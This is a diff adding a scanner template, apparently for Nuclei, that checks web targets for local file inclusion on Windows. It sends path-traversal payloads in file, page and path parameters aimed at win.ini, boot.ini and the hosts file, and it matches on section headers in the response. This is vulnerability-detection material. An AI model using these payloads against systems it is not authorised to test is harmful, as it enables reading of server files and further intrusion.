@@ -1,0 +1,30 @@
+id: m7-lfi-windows
+info:
+  name: M7 - LFI Windows System Files
+  author: Sharlix
+  severity: high
+  description: LFI detection on Windows systems targeting win.ini and boot.ini
+  tags: lfi,windows,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../../windows/win.ini"
+      - "{{BaseURL}}?file=../../../../windows/system32/drivers/etc/hosts"
+      - "{{BaseURL}}?file=..\..\..\..\windows\win.ini"
+      - "{{BaseURL}}?file=../../../../boot.ini"
+      - "{{BaseURL}}?file=/windows/win.ini"
+      - "{{BaseURL}}?page=../../../../windows/win.ini"
+      - "{{BaseURL}}?path=../../../../windows/win.ini"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "[boot loader]"
+          - "[fonts]"
+          - "[extensions]"
+          - "[mci extensions]"
+          - "[files]"
+        part: body
+        condition: or
